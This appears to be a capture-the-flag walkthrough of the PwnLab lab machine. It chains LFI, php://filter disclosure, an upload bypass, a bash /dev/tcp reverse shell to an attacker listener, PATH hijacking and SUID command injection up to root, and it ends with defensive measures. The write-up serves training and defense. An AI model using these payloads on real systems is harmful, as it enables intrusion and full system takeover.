Phase 1: Network Discovery

Before any attack, an attacker must discover what systems exist on the network. In real corporate environments, the target IP is rarely given — attackers use ARP-based discovery to map the live landscape.

Why This Matters

Reconnaissance is the foundation of every attack

Internal attackers use ARP requests to identify live hosts. This is passive, low-risk, and reveals the entire attack surface. In the real world, knowing which systems are alive determines the entire engagement strategy.

Corporate LAN Analogy

Imagine walking into a corporate office. Before you pick a door to open, you need to know which doors exist. netdiscover is the attacker's way of saying "which machines are powered on?" — it sends ARP requests and listens for replies, mapping the live network in seconds.

Attacker Reasoning

Why port 80 matters most

Port 80 (HTTP) reveals a web application. Web apps are high-value targets because they accept user input, connect to databases, and often contain business logic flaws. MySQL on 3306 confirms a backend database — credentials found later will unlock it.

Real-World Context

In a typical penetration test, finding Apache 2.4.29 + MySQL 5.7.23 immediately suggests a PHP-based LAMP stack. Attackers note the versions for vulnerability research and build their exploit strategy around PHP misconfigurations.

Why Attackers Brute-Force Directories

Directory bruteforcing reveals hidden attack surfaces that developers never intended to expose. config.php is the jackpot — it almost always contains database credentials or secret keys. In the real world, this is how attackers find admin panels, backup files, and configuration dumps.

Phase 5: Parameter Discovery

Dynamic web pages use parameters to load content. When developers use include() with user-supplied parameters, every value becomes a potential vulnerability. The attacker probes for patterns.

parameter fuzzing
# Testing common parameters on index.php

http://192.168.1.8/index.php?page=test ← content rendered
http://192.168.1.8/index.php?page=home ← content rendered
http://192.168.1.8/index.php?page=login ← content rendered
http://192.168.1.8/index.php?page=about ← blank/warning

✔ Dynamic file inclusion confirmed
# The server loads files based on the ?page= parameter
# Pattern: include($_GET['page'] . ".php");
Critical Understanding

"Whenever you see index.php, expect parameters"

Parameters like ?page=, ?lang=, ?file=, ?include=, ?template= are attacker magnets. They often map directly to include() or require() calls in PHP. When user input reaches include(), you have Local File Inclusion — a high-severity vulnerability.

Phase 6: Local File Inclusion (LFI)

When user input controls include(), attackers try to read system files. Direct LFI may fail if PHP blocks execution — but that does not mean the application is safe. Advanced attackers switch techniques.

LFI testing
# Basic LFI attempt (direct path traversal)
?page=../../../../etc/passwd
✘ Failed — PHP execution blocked

# "Failure doesn't mean safe. It means filtered."
# Advanced attackers continue with PHP filter abuse...

What is LFI?

Local File Inclusion occurs when an application uses user-supplied input to load files without proper sanitization. The PHP code include($_GET['page'] . ".php"); lets an attacker read /etc/passwd, config files, or source code — anything the web server user can read. In the real world, LFI is a gateway to credential theft, code execution, and full compromise.

Phase 7: PHP Filter Abuse

If PHP won't execute malicious files, maybe it will reveal their source. php://filter is a PHP internal stream that reads files and encodes them — bypassing execution entirely.

PHP filter exploit
# PHP filter payload to read config.php source
?page=php://filter/convert.base64-encode/resource=config

# PHP does NOT execute config — it reads and encodes it
PD9waHAgLy8gRGF0YWJhc2UgY29uZmlndXJhdGlvbgok...[base64 encoded]

✔ Source code disclosed via Base64 encoding
Step 1: File Requested → config.php
Step 2: PHP Filter Applied → convert.base64-encode
Step 3: File Encoded → PHP source → Base64 string
Step 4: Source Exposed → Credentials readable
Why This Bypasses Execution

php://filter is a stream wrapper, not a file loader

When PHP sees php://filter/convert.base64-encode/resource=config, it does not execute config.php. Instead, it opens config.php as a resource, applies the Base64 encoding filter, and outputs the encoded result. The PHP code inside config.php never reaches the parser — it is treated as plain text. This bypasses all execution-based security checks.

Why Base64 Storage is Insecure

Base64 is encoding, not encryption. echo 'Sld6WHVCSkpOeQ==' | base64 -d instantly reveals the plaintext password. Real applications must use bcrypt, Argon2, or PBKDF2 with a salt. Storing passwords as Base64 is equivalent to storing them in plaintext — one decode away from compromise.

Phase 9: File Upload Vulnerability

The application allows image uploads but only checks the file extension, not the actual content. This is one of the most dangerous web vulnerabilities — it turns file upload into remote code execution.

upload bypass
# Application checks only extension
shell.php → Blocked (.php not allowed)

# Bypass: disguise as image
shell.php.gif → Accepted ✓

# The server sees .gif but PHP still executes the code inside
# Uploaded to: /upload/b1a99ebaad4dd28f57517de36e770484.gif
Extension vs Content

The server trusts the extension, not the content

Modern applications validate both extension AND content (MIME type, magic bytes). This application only checks the extension. By naming a PHP payload shell.php.gif, the webserver serves it as PHP and executes the embedded code. This is a CRITICAL vulnerability that leads directly to Remote Code Execution.

The Chain So Far

User input reached system()

The LFI vulnerability let us include arbitrary files. The upload vulnerability let us plant a PHP file on the server. Combined, they let us execute arbitrary system commands. This is the critical turning point — from information disclosure to code execution.

Phase 11: Reverse Shell

A web shell requires sending commands one at a time through the URL. Attackers need an interactive terminal for stable access. A reverse shell makes the victim connect back to the attacker.

Attacker
192.168.1.5
Victim
192.168.1.8
attacker — listener
# nc -lvnp 4444

listening on [any] 4444 ...
connect to [192.168.1.5] from [192.168.1.8]

www-data@pwnlab:/$
victim — payload
# Reverse shell one-liner
bash -c 'bash -i >& /dev/tcp/192.168.1.5/4444 0>&1'

# bash -i → interactive shell
# /dev/tcp → network connection
# >& + 0>&1 → redirect IO through network
Why Reverse Shells

"The web app trusted user input. User input reached system(). system() executed Bash. Bash opened a network connection. We caught it using Netcat."

A reverse shell gives attackers an interactive terminal with job control, tab completion, and the ability to run commands that require a TTY (su, sudo, editors). This is the standard foothold for privilege escalation.

Phase 12: Shell Stabilization (TTY Upgrade)

The initial reverse shell works but is unstable — commands like su, sudo, and editors will not function correctly. Attackers must convert it into a fully interactive TTY shell.

Spawn a pseudo-terminal

python -c 'import pty; pty.spawn("/bin/bash")' — Creates a pseudo-terminal on the target, tricking programs into thinking they have a real terminal.

Background the shell

Press CTRL + Z on the keyboard to background the current netcat session.

Fix terminal settings (local)

stty raw -echo — Disables local echo and line buffering so terminal control sequences pass through correctly.

Bring shell back

fg followed by ENTER restores the backgrounded reverse shell session.

Set terminal type

export TERM=xterm — Tells the remote shell to use xterm-compatible escape sequences. Optional: reset to clean the terminal state.

Verify interactive TTY

tty → /dev/pts/0 — Confirms the shell is now fully interactive. Commands like su, sudo, vim, and arrow keys work correctly.

Phase 14: PATH Hijacking

The kane user has a binary called msgmike that calls cat without using an absolute path. When a program runs a command without specifying its full path, Linux searches the PATH environment variable — which attackers can manipulate.

PATH hijack
kane@pwnlab:~$ ls -la
-rwxr-xr-x 1 kane kane msgmike

kane@pwnlab:~$ file msgmike
msgmike: ELF 64-bit LSB executable

kane@pwnlab:~$ strings msgmike | grep cat
cat /home/mike/msg.txt ← calls cat without full path!

kane@pwnlab:~$ cd /tmp
kane@pwnlab:/tmp$ echo /bin/bash > cat
kane@pwnlab:/tmp$ chmod 777 cat
kane@pwnlab:/tmp$ export PATH=/tmp:$PATH
kane@pwnlab:/tmp$ cd ~ && ./msgmike
mike@pwnlab:~$ ← became user mike!
PATH Hijacking Logic

When msgmike calls "cat", Linux searches PATH in order

1. msgmike executes cat /home/mike/msg.txt

2. Linux searches each directory in PATH for an executable named "cat"

3. Since PATH starts with /tmp, Linux finds our malicious "cat" first

4. Our "cat" contains /bin/bash — so the binary launches a shell

5. The shell inherits the binary's privileges → we become mike

Why Relative Commands Are Dangerous

Using cat instead of /bin/cat means the program trusts the user's PATH environment variable. Any user can modify their PATH. This is a design flaw — the binary should always use absolute paths. In the real world, this vulnerability is found in cron jobs, system scripts, and SUID binaries.

Phase 15: SUID Exploitation

As user mike, we find a root-owned SUID binary called msg2root. SUID (Set User ID) means the binary runs with the file owner's privileges — in this case, root. Combined with an unsafe system() call, this is a direct path to root.

-rwsr-sr-x 1 root root msg2root SUID bit set (s in owner execute position) → runs as root
SUID exploitation
mike@pwnlab:~$ ./msg2root
Message for root: hello && /bin/sh
Message sent successfully
# ← root shell obtained

# id
uid=1002(mike) euid=0(root)

# uid = real user (mike)
# euid = effective user (root) ← full root privileges
SUID + Unsafe system() = Root

How msg2root is exploited

The binary uses system() to send the message, passing user input directly to a shell. The command injection payload hello && /bin/sh executes the legitimate message send AND then launches a shell. Because the binary is SUID root, the new shell also runs as root. This is a classic command injection vulnerability in a privileged context.

Phase 16: Root Compromise

Effective UID root means full system compromise. The attacker can now read any file, kill any process, and fully control the machine.

UID vs EUID

UID (Real User ID) = who you logged in as (mike, 1002). EUID (Effective User ID) = what privileges you have (root, 0). When a SUID binary runs, the EUID becomes the binary's owner. The kernel uses EUID for permission checks, so EUID=root means full system access.

Why /bin/cat

We use /bin/cat (absolute path) instead of just cat because the PATH was previously hijacked. Using the full path ensures we call the real cat binary and safely read the flag file. This is a best practice even for attackers.

The Kill Chain Principle

No single vulnerability caused the compromise. LFI alone is dangerous. Credential reuse alone is dangerous. SUID misconfiguration alone is dangerous. But chained together in sequence, they create a path from anonymous remote access to full root compromise. This is how real-world attacks work — not through a single zero-day, but through a cascade of small failures.

Blue Team

Defensive Measures

Every vulnerability in this walkthrough has a corresponding defense. Understanding how to break systems is incomplete without knowing how to protect them.

LFI Prevention

Whitelist Inclusion

Never use user input directly in include()/require(). Maintain a whitelist of allowed file names and map user input to the whitelist. Disable PHP stream wrappers if not needed.

PHP Filter Mitigation

Disable Unused Streams

Set allow_url_fopen = Off and restrict php:// filters. Use allow_url_include = Off in php.ini. Audit all file operations for user-controlled input.

Credential Storage

Strong Password Hashing

Use bcrypt (cost factor 12+), Argon2id, or PBKDF2. Never store passwords as Base64, MD5, or SHA1. Enforce password complexity and rotate credentials regularly.

Secure Uploads

Defense in Depth

Validate MIME type AND magic bytes. Store uploads outside webroot. Disable PHP execution in upload directories. Use randomized filenames. Scan for malware.

Least Privilege

Restrict Web Server User

Run Apache/Nginx as a dedicated low-privilege user. Restrict file system access. Do not allow www-data to read sensitive files like config.php or /etc/shadow.

PATH Security

Always Use Absolute Paths

In scripts and binaries, always use absolute paths (/bin/cat not cat). Never inherit or trust the user's PATH environment variable. Sanitize PATH in scripts.

SUID Restrictions

Minimize SUID Binaries

Audit all SUID binaries regularly. Remove SUID from unnecessary files. Never use system() or popen() in SUID binaries. Use capabilities instead of SUID where possible.

Command Injection

Never Pass User Input to Shell

Avoid system(), exec(), passthru(), shell_exec() with user input. Use escapeshellarg()/escapeshellcmd() if shell execution is unavoidable. Prefer safer APIs.

Conclusion

Final Pentester Mindset

This walkthrough taught techniques. But the real lesson is how to think like an attacker.

"No single vulnerability caused the compromise. The real danger came from chaining small weaknesses together."

LFI alone is a vulnerability. Credential reuse is a vulnerability. SUID misconfiguration is a vulnerability. But when an attacker chains them — directory bruteforce → LFI → PHP filter → credential leak → database access → upload bypass → RCE → reverse shell → user pivot → PATH hijack → SUID abuse → root — each weakness amplifies the next. The result is total compromise.

01

Think Like an Attacker

Every feature is a potential vulnerability. Every parameter is an attack vector. Question everything.

02

Enumerate Relentlessly

Attackers don't guess — they discover. Directory bruteforcing, port scanning, parameter fuzzing — information is power.

03

Chain Vulnerabilities

No single bug wins. The attack chain is what matters. Think in sequences, not single exploits.

04

Understand Impact

Low-severity issues become critical when chained. Understand the business impact of every finding.

05

Think Beyond Tools

Tools find low-hanging fruit. Methodology finds root access. Understand the logic, not just the syntax.

06

Defenders Must Chain Too

Attackers chain vulnerabilities — defenders must chain defenses. One fix is never enough. Defense in depth is the only answer.
